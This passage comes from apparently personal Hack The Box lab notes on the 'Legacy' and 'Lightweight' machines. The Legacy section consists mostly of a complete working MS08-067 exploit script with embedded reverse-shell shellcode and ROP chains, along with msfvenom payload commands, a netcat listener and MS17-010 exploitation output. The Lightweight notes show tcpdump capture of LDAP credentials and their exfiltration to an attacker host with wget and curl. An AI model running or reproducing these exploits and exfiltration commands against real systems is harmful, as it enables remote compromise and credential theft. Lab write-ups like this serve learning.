-oA nmap/smb_vulns 10.10.10.4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 19:50 EST Nmap scan report for 10.10.10.4 Host is up (0.041s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-vuln-cve2009-3103: | VULNERABLE: | SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497) | State: VULNERABLE | IDs: CVE:CVE-2009-3103 | Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2, | Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a | denial of service (system crash) via an \u0026amp; (ampersand) character in a Process ID High header field in a NEGOTIATE | PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location, | aka \u0026quot;SMBv2 Negotiation Vulnerability.\u0026quot; | | Disclosure date: 2009-09-08 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103 |_ http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103 | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: LIKELY VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://technet.microsoft.com/en-us/library/security/ms08-067.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx  SMBMAP\n/home/htb/boxes/legacy# smbmap -H 10.10.10.4 [+] Finding open SMB ports.... [+] User SMB session establishd on 10.10.10.4... [+] IP: 10.10.10.4:445 Name: 10.10.10.4 Disk Permissions ---- ----------- [!] Access Denied  ms08-067 #!/usr/bin/env python import struct import time import sys from threading import Thread # Thread is imported incase you would like to modify try: from impacket import smb from impacket import uuid #from impacket.dcerpc import dcerpc from impacket.dcerpc.v5 import transport except ImportError, _: print 'Install the following library to make this script work' print 'Impacket : https://github.com/CoreSecurity/impacket.git' print 'PyCrypto : https://pypi.python.org/pypi/pycrypto' sys.exit(1) print '#######################################################################' print '# MS08-067 Exploit' print '# This is a modified verion of Debasis Mohanty\\'s code (https://www.exploit-db.com/exploits/7132/).' print '# The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi' print '#' print '# Mod in 2018 by Andy Acer' print '# - Added support for selecting a target port at the command line.' print '# - Changed library calls to allow for establishing a NetBIOS session for SMB transport' print '# - Changed shellcode handling to allow for variable length shellcode.' print '#######################################################################\\n' print (''' $ This version requires the Python Impacket library version to 0_9_17 or newer. $ $ Here's how to upgrade if necessary: $ $ git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/ $ cd impacket $ pip install . ''') print '#######################################################################\\n' # ------------------------------------------------------------------------ # REPLACE THIS SHELLCODE with shellcode generated for your use # Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS. # # Example msfvenom commands to generate shellcode: # msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b \u0026quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026quot; -f c -a x86 --platform windows # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b \u0026quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026quot; -f c -a x86 --platform windows # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b \u0026quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026quot; -f c -a x86 --platform windows # Reverse TCP to 10.11.0.157 port 62000: shellcode=( \u0026quot;\\x31\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\u0026quot; \u0026quot;\\x42\\xf6\\xc3\\xef\\x83\\xee\\xfc\\xe2\\xf4\\xbe\\x1e\\x41\\xef\\x42\\xf6\u0026quot; \u0026quot;\\xa3\\x66\\xa7\\xc7\\x03\\x8b\\xc9\\xa6\\xf3\\x64\\x10\\xfa\\x48\\xbd\\x56\u0026quot; \u0026quot;\\x7d\\xb1\\xc7\\x4d\\x41\\x89\\xc9\\x73\\x09\\x6f\\xd3\\x23\\x8a\\xc1\\xc3\u0026quot; \u0026quot;\\x62\\x37\\x0c\\xe2\\x43\\x31\\x21\\x1d\\x10\\xa1\\x48\\xbd\\x52\\x7d\\x89\u0026quot; \u0026quot;\\xd3\\xc9\\xba\\xd2\\x97\\xa1\\xbe\\xc2\\x3e\\x13\\x7d\\x9a\\xcf\\x43\\x25\u0026quot; \u0026quot;\\x48\\xa6\\x5a\\x15\\xf9\\xa6\\xc9\\xc2\\x48\\xee\\x94\\xc7\\x3c\\x43\\x83\u0026quot; \u0026quot;\\x39\\xce\\xee\\x85\\xce\\x23\\x9a\\xb4\\xf5\\xbe\\x17\\x79\\x8b\\xe7\\x9a\u0026quot; \u0026quot;\\xa6\\xae\\x48\\xb7\\x66\\xf7\\x10\\x89\\xc9\\xfa\\x88\\x64\\x1a\\xea\\xc2\u0026quot; \u0026quot;\\x3c\\xc9\\xf2\\x48\\xee\\x92\\x7f\\x87\\xcb\\x66\\xad\\x98\\x8e\\x1b\\xac\u0026quot; \u0026quot;\\x92\\x10\\xa2\\xa9\\x9c\\xb5\\xc9\\xe4\\x28\\x62\\x1f\\x9e\\xf0\\xdd\\x42\u0026quot; \u0026quot;\\xf6\\xab\\x98\\x31\\xc4\\x9c\\xbb\\x2a\\xba\\xb4\\xc9\\x45\\x09\\x16\\x57\u0026quot; \u0026quot;\\xd2\\xf7\\xc3\\xef\\x6b\\x32\\x97\\xbf\\x2a\\xdf\\x43\\x84\\x42\\x09\\x16\u0026quot; \u0026quot;\\xbf\\x12\\xa6\\x93\\xaf\\x12\\xb6\\x93\\x87\\xa8\\xf9\\x1c\\x0f\\xbd\\x23\u0026quot; \u0026quot;\\x54\\x85\\x47\\x9e\\xc9\\xe4\\x42\\x6b\\xab\\xed\\x42\\x04\\xf3\\x66\\xa4\u0026quot; \u0026quot;\\x9c\\xd3\\xb9\\x15\\x9e\\x5a\\x4a\\x36\\x97\\x3c\\x3a\\xc7\\x36\\xb7\\xe3\u0026quot; \u0026quot;\\xbd\\xb8\\xcb\\x9a\\xae\\x9e\\x33\\x5a\\xe0\\xa0\\x3c\\x3a\\x2a\\x95\\xae\u0026quot; \u0026quot;\\x8b\\x42\\x7f\\x20\\xb8\\x15\\xa1\\xf2\\x19\\x28\\xe4\\x9a\\xb9\\xa0\\x0b\u0026quot; \u0026quot;\\xa5\\x28\\x06\\xd2\\xff\\xee\\x43\\x7b\\x87\\xcb\\x52\\x30\\xc3\\xab\\x16\u0026quot; \u0026quot;\\xa6\\x95\\xb9\\x14\\xb0\\x95\\xa1\\x14\\xa0\\x90\\xb9\\x2a\\x8f\\x0f\\xd0\u0026quot; \u0026quot;\\xc4\\x09\\x16\\x66\\xa2\\xb8\\x95\\xa9\\xbd\\xc6\\xab\\xe7\\xc5\\xeb\\xa3\u0026quot; \u0026quot;\\x10\\x97\\x4d\\x23\\xf2\\x68\\xfc\\xab\\x49\\xd7\\x4b\\x5e\\x10\\x97\\xca\u0026quot; \u0026quot;\\xc5\\x93\\x48\\x76\\x38\\x0f\\x37\\xf3\\x78\\xa8\\x51\\x84\\xac\\x85\\x42\u0026quot; \u0026quot;\\xa5\\x3c\\x3a\u0026quot; ) # ------------------------------------------------------------------------ # Gotta make No-Ops (NOPS) + shellcode = 410 bytes num_nops = 410 - len(shellcode) newshellcode = \u0026quot;\\x90\u0026quot; * num_nops newshellcode += shellcode # Add NOPS to the front shellcode = newshellcode # Switcheroo with the newshellcode temp variable #print \u0026quot;Shellcode length: %s\\n\\n\u0026quot; % len(shellcode) nonxjmper = \u0026quot;\\x08\\x04\\x02\\x00%s\u0026quot; + \u0026quot;A\u0026quot; * 4 + \u0026quot;%s\u0026quot; + \\ \u0026quot;A\u0026quot; * 42 + \u0026quot;\\x90\u0026quot; * 8 + \u0026quot;\\xeb\\x62\u0026quot; + \u0026quot;A\u0026quot; * 10 disableNXjumper = \u0026quot;\\x08\\x04\\x02\\x00%s%s%s\u0026quot; + \u0026quot;A\u0026quot; * \\ 28 + \u0026quot;%s\u0026quot; + \u0026quot;\\xeb\\x02\u0026quot; + \u0026quot;\\x90\u0026quot; * 2 + \u0026quot;\\xeb\\x62\u0026quot; ropjumper = \u0026quot;\\x00\\x08\\x01\\x00\u0026quot; + \u0026quot;%s\u0026quot; + \u0026quot;\\x10\\x01\\x04\\x01\u0026quot;; module_base = 0x6f880000 def generate_rop(rvas): gadget1 = \u0026quot;\\x90\\x5a\\x59\\xc3\u0026quot; gadget2 = [\u0026quot;\\x90\\x89\\xc7\\x83\u0026quot;, \u0026quot;\\xc7\\x0c\\x6a\\x7f\u0026quot;, \u0026quot;\\x59\\xf2\\xa5\\x90\u0026quot;] gadget3 = \u0026quot;\\xcc\\x90\\xeb\\x5a\u0026quot; ret = struct.pack('\u0026lt;L', 0x00018000) ret += struct.pack('\u0026lt;L', rvas['call_HeapCreate'] + module_base) ret += struct.pack('\u0026lt;L', 0x01040110) ret += struct.pack('\u0026lt;L', 0x01010101) ret += struct.pack('\u0026lt;L', 0x01010101) ret += struct.pack('\u0026lt;L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['pop ecx / ret'] + module_base) ret += gadget1 ret += struct.pack('\u0026lt;L', rvas['mov [eax], ecx / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['jmp eax'] + module_base) ret += gadget2[0] ret += gadget2[1] ret += struct.pack('\u0026lt;L', rvas[ 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['pop ecx / ret'] + module_base) ret += gadget2[2] ret += struct.pack('\u0026lt;L', rvas['mov [eax+0x10], ecx / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['add eax, 8 / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['jmp eax'] + module_base) ret += gadget3 return ret class SRVSVC_Exploit(Thread): def __init__(self, target, os, port=445): super(SRVSVC_Exploit, self).__init__() # MODIFIED HERE # Changed __port to port ... not sure if that does anything. I'm a newb. self.port = port self.target = target self.os = os def __DCEPacket(self): if (self.os == '1'): print 'Windows XP SP0/SP1 Universal\\n' ret = \u0026quot;\\x61\\x13\\x00\\x01\u0026quot; jumper = nonxjmper % (ret, ret) elif (self.os == '2'): print 'Windows 2000 Universal\\n' ret = \u0026quot;\\xb0\\x1c\\x1f\\x00\u0026quot; jumper = nonxjmper % (ret, ret) elif (self.os == '3'): print 'Windows 2003 SP0 Universal\\n' ret = \u0026quot;\\x9e\\x12\\x00\\x01\u0026quot; # 0x01 00 12 9e jumper = nonxjmper % (ret, ret) elif (self.os == '4'): print 'Windows 2003 SP1 English\\n' ret_dec = \u0026quot;\\x8c\\x56\\x90\\x7c\u0026quot; # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL ret_pop = \u0026quot;\\xf4\\x7c\\xa2\\x7c\u0026quot; # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL jmp_esp = \u0026quot;\\xd3\\xfe\\x86\\x7c\u0026quot; # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL disable_nx = \u0026quot;\\x13\\xe4\\x83\\x7c\u0026quot; # 0x 7c 83 e4 13 NX disable @NTDLL.DLL jumper = disableNXjumper % ( ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2) elif (self.os == '5'): print 'Windows XP SP3 French (NX)\\n' ret = \u0026quot;\\x07\\xf8\\x5b\\x59\u0026quot; # 0x59 5b f8 07 disable_nx = \u0026quot;\\xc2\\x17\\x5c\\x59\u0026quot; # 0x59 5c 17 c2 # the nonxjmper also work in this case. jumper = nonxjmper % (disable_nx, ret) elif (self.os == '6'): print 'Windows XP SP3 English (NX)\\n' ret = \u0026quot;\\x07\\xf8\\x88\\x6f\u0026quot; # 0x6f 88 f8 07 disable_nx = \u0026quot;\\xc2\\x17\\x89\\x6f\u0026quot; # 0x6f 89 17 c2 # the nonxjmper also work in this case. jumper = nonxjmper % (disable_nx, ret) elif (self.os == '7'): print 'Windows XP SP3 English (AlwaysOn NX)\\n' rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6, 'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64} # the nonxjmper also work in this case. jumper = generate_rop(rvasets) + \u0026quot;AB\u0026quot; else: print 'Not supported OS version\\n' sys.exit(-1) print '[-]Initiating connection' # MORE MODIFICATIONS HERE ############################################################################################# if (self.port == '445'): self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\\\pipe\\\\browser]' % self.target) else: # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here. # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to # establish a NetBIOS Session. The NetBIOS session shows as NBSS in Wireshark. self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\\\browser' ) self.__trans.connect() print '[-]connected to ncacn_np:%s[\\\\pipe\\\\browser]' % self.target self.__dce = self.__trans.DCERPC_class(self.__trans) self.__dce.bind(uuid.uuidtup_to_bin( ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0'))) path = \u0026quot;\\x5c\\x00\u0026quot; + \u0026quot;ABCDEFGHIJ\u0026quot; * 10 + shellcode + \u0026quot;\\x5c\\x00\\x2e\\x00\\x2e\\x00\\x5c\\x00\\x2e\\x00\\x2e\\x00\\x5c\\x00\u0026quot; + \\ \u0026quot;\\x41\\x00\\x42\\x00\\x43\\x00\\x44\\x00\\x45\\x00\\x46\\x00\\x47\\x00\u0026quot; + jumper + \u0026quot;\\x00\u0026quot; * 2 server = \u0026quot;\\xde\\xa4\\x98\\xc5\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x41\\x00\\x42\\x00\\x43\\x00\\x44\\x00\\x45\\x00\\x46\\x00\\x47\\x00\\x00\\x00\u0026quot; prefix = \u0026quot;\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x5c\\x00\\x00\\x00\u0026quot; # NEW HOTNESS # The Path Length and the \u0026quot;Actual Count\u0026quot; SMB parameter have to match. Path length in bytes # is double the ActualCount field. MaxCount also seems to match. These fields in the SMB protocol # store hex values in reverse byte order. So: 36 01 00 00 =\u0026gt; 00 00 01 36 =\u0026gt; 310. No idea why it's \u0026quot;doubled\u0026quot; # from 310 to 620. 620 = 410 shellcode + extra stuff in the path. MaxCount = \u0026quot;\\x36\\x01\\x00\\x00\u0026quot; # Decimal 310. =\u0026gt; Path length of 620. Offset = \u0026quot;\\x00\\x00\\x00\\x00\u0026quot; ActualCount = \u0026quot;\\x36\\x01\\x00\\x00\u0026quot; # Decimal 310. =\u0026gt; Path length of 620 self.__stub = server + MaxCount + Offset + ActualCount + \\ path + \u0026quot;\\xE8\\x03\\x00\\x00\u0026quot; + prefix + \u0026quot;\\x01\\x10\\x00\\x00\\x00\\x00\\x00\\x00\u0026quot; return def run(self): self.__DCEPacket() self.__dce.call(0x1f, self.__stub) time.sleep(3) print 'Exploit finish\\n' if __name__ == '__main__': try: target = sys.argv[1] os = sys.argv[2] port = sys.argv[3] except IndexError: print '\\nUsage: %s \u0026lt;target ip\u0026gt; \u0026lt;os #\u0026gt; \u0026lt;Port #\u0026gt;\\n' % sys.argv[0] print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445' print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)' print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal' print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English' print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)' print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)' print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)' print '' print 'FYI: nmap has a good OS discovery script that pairs well with this exploit:' print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1' print '' sys.exit(-1) current = SRVSVC_Exploit(target, os, port) current.start()  MSFVENOM\nhttps://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-08-067\n msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b \u0026quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026quot; -f py -v shellcode -a x86 --platform windows Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai failed with A valid opcode permutation could not be found. Attempting to encode payload with 1 iterations of generic/none generic/none failed with Encoding failed due to a bad character (index=3, char=0x00) Attempting to encode payload with 1 iterations of x86/call4_dword_xor x86/call4_dword_xor succeeded with size 348 (iteration=0) x86/call4_dword_xor chosen with final size 348 Payload size: 348 bytes Final size of py file: 1872 bytes shellcode = \u0026quot;\u0026quot; shellcode += \u0026quot;\\x29\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\u0026quot; shellcode += \u0026quot;\\x81\\x76\\x0e\\xae\\xf1\\xdb\\xb3\\x83\\xee\\xfc\\xe2\\xf4\u0026quot; shellcode += \u0026quot;\\x52\\x19\\x59\\xb3\\xae\\xf1\\xbb\\x3a\\x4b\\xc0\\x1b\\xd7\u0026quot; shellcode += \u0026quot;\\x25\\xa1\\xeb\\x38\\xfc\\xfd\\x50\\xe1\\xba\\x7a\\xa9\\x9b\u0026quot; shellcode += \u0026quot;\\xa1\\x46\\x91\\x95\\x9f\\x0e\\x77\\x8f\\xcf\\x8d\\xd9\\x9f\u0026quot; shellcode += \u0026quot;\\x8e\\x30\\x14\\xbe\\xaf\\x36\\x39\\x41\\xfc\\xa6\\x50\\xe1\u0026quot; shellcode += \u0026quot;\\xbe\\x7a\\x91\\x8f\\x25\\xbd\\xca\\xcb\\x4d\\xb9\\xda\\x62\u0026quot; shellcode += \u0026quot;\\xff\\x7a\\x82\\x93\\xaf\\x22\\x50\\xfa\\xb6\\x12\\xe1\\xfa\u0026quot; shellcode += \u0026quot;\\x25\\xc5\\x50\\xb2\\x78\\xc0\\x24\\x1f\\x6f\\x3e\\xd6\\xb2\u0026quot; shellcode += \u0026quot;\\x69\\xc9\\x3b\\xc6\\x58\\xf2\\xa6\\x4b\\x95\\x8c\\xff\\xc6\u0026quot; shellcode += \u0026quot;\\x4a\\xa9\\x50\\xeb\\x8a\\xf0\\x08\\xd5\\x25\\xfd\\x90\\x38\u0026quot; shellcode += \u0026quot;\\xf6\\xed\\xda\\x60\\x25\\xf5\\x50\\xb2\\x7e\\x78\\x9f\\x97\u0026quot; shellcode += \u0026quot;\\x8a\\xaa\\x80\\xd2\\xf7\\xab\\x8a\\x4c\\x4e\\xae\\x84\\xe9\u0026quot; shellcode += \u0026quot;\\x25\\xe3\\x30\\x3e\\xf3\\x99\\xe8\\x81\\xae\\xf1\\xb3\\xc4\u0026quot; shellcode += \u0026quot;\\xdd\\xc3\\x84\\xe7\\xc6\\xbd\\xac\\x95\\xa9\\x0e\\x0e\\x0b\u0026quot; shellcode += \u0026quot;\\x3e\\xf0\\xdb\\xb3\\x87\\x35\\x8f\\xe3\\xc6\\xd8\\x5b\\xd8\u0026quot; shellcode += \u0026quot;\\xae\\x0e\\x0e\\xe3\\xfe\\xa1\\x8b\\xf3\\xfe\\xb1\\x8b\\xdb\u0026quot; shellcode += \u0026quot;\\x44\\xfe\\x04\\x53\\x51\\x24\\x4c\\xd9\\xab\\x99\\xd1\\xb9\u0026quot; shellcode += \u0026quot;\\xa0\\xff\\xb3\\xb1\\xae\\xf0\\x60\\x3a\\x48\\x9b\\xcb\\xe5\u0026quot; shellcode += \u0026quot;\\xf9\\x99\\x42\\x16\\xda\\x90\\x24\\x66\\x2b\\x31\\xaf\\xbf\u0026quot; shellcode += \u0026quot;\\x51\\xbf\\xd3\\xc6\\x42\\x99\\x2b\\x06\\x0c\\xa7\\x24\\x66\u0026quot; shellcode += \u0026quot;\\xc6\\x92\\xb6\\xd7\\xae\\x78\\x38\\xe4\\xf9\\xa6\\xea\\x45\u0026quot; shellcode += \u0026quot;\\xc4\\xe3\\x82\\xe5\\x4c\\x0c\\xbd\\x74\\xea\\xd5\\xe7\\xb2\u0026quot; shellcode += \u0026quot;\\xaf\\x7c\\x9f\\x97\\xbe\\x37\\xdb\\xf7\\xfa\\xa1\\x8d\\xe5\u0026quot; shellcode += \u0026quot;\\xf8\\xb7\\x8d\\xfd\\xf8\\xa7\\x88\\xe5\\xc6\\x88\\x17\\x8c\u0026quot; shellcode += \u0026quot;\\x28\\x0e\\x0e\\x3a\\x4e\\xbf\\x8d\\xf5\\x51\\xc1\\xb3\\xbb\u0026quot; shellcode += \u0026quot;\\x29\\xec\\xbb\\x4c\\x7b\\x4a\\x3b\\xae\\x84\\xfb\\xb3\\x15\u0026quot; shellcode += \u0026quot;\\x3b\\x4c\\x46\\x4c\\x7b\\xcd\\xdd\\xcf\\xa4\\x71\\x20\\x53\u0026quot; shellcode += \u0026quot;\\xdb\\xf4\\x60\\xf4\\xbd\\x83\\xb4\\xd9\\xae\\xa2\\x24\\x66\u0026quot;  windows support versions\nExample: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445 Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used) Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX) Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX) Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)  edited with vi q@a\nWindows XP SP0/SP1 Universal, port 445 Windows 2000 Universal, port 139 (445 could also be used) Windows 2003 SP0 Universal Windows 2003 SP1 English Windows XP SP3 French (NX) Windows XP SP3 English (NX) Windows XP SP3 English (AlwaysOn NX)  git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/ cd impacket pip install .  python ms08-067.py 10.10.10.4 6 445 nc -lvnp 443  MS-17-010\nclone the rep then run everything inside the repo so the python has access to the mysqm module.\nhttps://github.com/helviojunior/MS17-010.git  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.14_443.exe  python send_and_execute.py 10.10.10.4 rev_10.10.14.14_443.exe Trying to connect to 10.10.10.4:445 Target OS: Windows 5.1 Using named pipe: browser Groom packets attempt controlling next transaction on x86 success controlling one transaction modify parameter count to 0xffffffff to be able to write backward leak next transaction CONNECTION: 0x821f9638 SESSION: 0xe1ee5c18 FLINK: 0x7bd48 InData: 0x7ae28 MID: 0xa TRANS1: 0x78b50 TRANS2: 0x7ac90 modify transaction struct for arbitrary read/write make this SMB session to be SYSTEM current TOKEN addr: 0xe1f45b50 userAndGroupCount: 0x3 userAndGroupsAddr: 0xe1f45bf0 overwriting token UserAndGroups Sending file BURVZM.exe... Opening SVCManager on 10.10.10.4..... Creating service jOGJ..... Starting service jOGJ..... The NETBIOS connection with the remote host timed out. Removing service jOGJ..... ServiceExec Error on: 10.10.10.4 nca_s_proto_error Done  "
},
{
	"uri": "/hackthebox/boxes/lightweight/",
	"title": "LightWeight",
	"tags": [],
	"description": "",
	"content": "Lightweight has some kind of waf in place that\u0026rsquo;s prevents brute forcing of any kind. It creates a user based on your IP address. that will grant us access. once somebody visits the website it creates a username \u0026amp; password based on that person IP address, creepy.\ninitially you will need to change your hosts file lightweight.htb\nssh ippaddr@lightweight.htb password = ipaddress\npasswd to change password once logged in.\nLinux version 3.10.0-862.3.3.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-28) (GCC) ) #1 SMP Fri Jun 15 04:15:27 UTC 2018\nCentOS Linux release 7.5.1804 (Core)\nID_LIKE=\u0026ldquo;rhel fedora\u0026rdquo; \u0026mdash; ping root\nversion 7\ntcpdump has a user probably how it finds connnected ip, there are two ladapusers.\nmight have to tunnel in using ssh. there seems to be a webpage running on port 443 on the localhost. also ldap might offer something more connecting locally.\n[10.10.14.14@lightweight ~]$ hostname lightweight.htb [10.10.14.14@lightweight ~]$ domainname (none) [10.10.14.14@lightweight ~]$ domainame -bash: domainame: command not found [10.10.14.14@lightweight ~]$ domainname (none)\nfound this file /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG\nwhich says its using openldap\nused sshuttle to gain access to the local webpage. interesting that it offered https to the localuser. that made me believe that localhost might be different i was able to run gobuster. to enumerate the web app directories.\n/usr/sbin/slapd -VV @(#) $OpenLDAP: slapd 2.4.44 (May 16 2018 09:55:53) $ mockbuild@c1bm.rdu2.centos.org:/builddir/build/BUILD/openldap-2.4.44/openldap-2.4.44/servers/slapd  tcpdump -vv -i any -s 65535 port 389 -w fart.pcap\nldap has triggers when a action time, triffer event or a triffered action. So there is something that triggers ldap.\nusing the wget post and curl post method i was barley able to transfer over the pcaps but i dont think i have to use wireshark to get the hashes. ;] domain htb.\nwget does hang though not sure why.\nwget \u0026ndash;post-file fart.pcap http://10.10.14.14\ncurl -F \u0026lsquo;data=@/home/10.10.14.14/fart.pcap\u0026rsquo; 10.10.14.14\nnc -lp 80\nuid=ldapuser2,ou=People,dc=lightweight,dc=htb 8bc8251332abe1d7f105d3e53ad39ac2S\\ 1TE4O@@´\n8bc8251332abe1d7f105d3e53ad39ac2 == correct\n8bc8251332abe1d7f105d3e53ad39ac2S:TE4MU@@m\n8bc8251332abe1d7f105d3e53ad39ac2nT\\hTE4@@\n0Y`T-uid=ldapuser2,ou=People,dc=lightweight,dc=htb 8bc8251332abe1d7f105d3e53ad39ac2STE4@@\nstrings= -uid=ldapuser2,ou=People,dc=lightweight,dc=htb 8bc8251332abe1d7f105d3e53ad39ac2\n   RFC 3062 LDAP Password Modify Extended Operation N/A     RFC 3112 LDAP Authentication Password Schema N/A    getcap -r / 2\u0026gt;/dev/null /usr/bin/ping = cap_net_admin,cap_net_raw+p /usr/sbin/mtr = cap_net_raw+ep /usr/sbin/suexec = cap_setgid,cap_setuid+ep /usr/sbin/arping = cap_net_raw+p /usr/sbin/clockdiff = cap_net_raw+p /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep\nLDAP http://www.openldap.org/doc/admin24/guide.html#Password%20Policies\nlight directory access protocol adds a layer of complexcity to linux directory service x.500. Creating different directory structures and allowing you to assign attributes to the directory structure helping with querying the file system. that can\u0026rsquo;t assig. essentially this gives you add control over the directories and allowing you to superficially change the structure given certain requirements are met.\nLdap runs over the tcp ip protocol, so its connection oriented.\nuid = username ou = Organizational Unit dc = Domain Compenent\nldapsearch -H ldap:// -x - \u0026quot;uid=ldapser2,ou=People,dc=lightweight,dc=htb\u0026quot; # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope subtree # filter: (objectclass=*) # requesting: - uid=ldapser2,ou=People,dc=lightweight,dc=htb # # search result search: 2 result: 32 No such object # numResponses: 1  john ldapurl -h localhost -b \u0026ldquo;dc=lightweight,dc=htb\u0026rdquo; -a dn,ou -s sub -f \u0026ldquo;(ou=*)\u0026rdquo;\nldap://localhost:389/dc=lightweight,dc=htb?dn,ou?sub?(ou=*)\ntomorrow try monitoring the trafic while i mess with it. shrug.\nusermod -a -G ldapuser2 10.10.14.14 bash: /usr/sbin/usermod: Permission denied\nsshuttled into localhost then was ablse to bypass the router or firewall denying\nfound ldapuser1 password inside status.php\nldapuser1 capabilities\n/usr/bin/ping = cap_net_admin,cap_net_raw+p │ /usr/sbin/mtr = cap_net_raw+ep │ /usr/sbin/suexec = cap_setgid,cap_setuid+ep │ /usr/sbin/arping = cap_net_raw+p │ /usr/sbin/clockdiff = cap_net_raw+p │ /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep │ 